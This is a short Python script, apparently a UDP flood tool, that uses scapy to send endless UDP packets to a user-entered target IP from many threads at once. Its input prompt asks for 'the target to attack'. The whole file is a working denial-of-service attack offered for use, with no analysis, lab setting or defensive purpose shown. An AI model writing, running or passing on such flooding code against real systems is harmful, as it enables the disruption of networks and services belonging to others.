from scapy.all import *
import threading

ip = input("Enter the target to attack: ")
thr = int(input("Thread: "))

def udp(address, i) :
    while True:
        print('Threading: ', i)
        ip=IP(dst=address)
        packet=ip/UDP()
        send(packet)

thrList = list ()
for i in range(thr):
    thrUdp = threading.Thread(target=udp, args=(ip, i))
    thrList.append(thrUdp)
    thrUdp.start()